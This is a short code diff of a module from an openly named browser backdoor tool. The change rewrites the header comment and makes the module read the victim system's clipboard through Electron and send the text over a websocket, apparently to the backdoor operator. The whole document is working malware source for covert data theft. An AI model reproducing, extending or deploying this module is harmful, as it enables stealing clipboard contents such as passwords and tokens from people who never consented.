@@ -1,14 +1,15 @@
-/*
- * Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
- * BrowserBackdoorServer by IMcPwn.
- * See the file 'LICENSE' for copying permission
- *
- * Info: Gets current clipboard text.
- * Parameters: None
- * Returns: Text in clipboard
- * Author: IMcPwn
+/**
+ * @file readClipboard Module
+ * @summary Reads the client system's clipboard.
+ * @author Carleton Stuberg
+ * @see https://github.com/IMcPwn/browser-backdoor
+ * @license MIT
+ * @version 0.1
  */
 
 electron = require('electron');
 
-return electron.clipboard.readText();
+/**
+ * @return {String} Text in clipboard
+ */
+ws.send(electron.clipboard.readText());
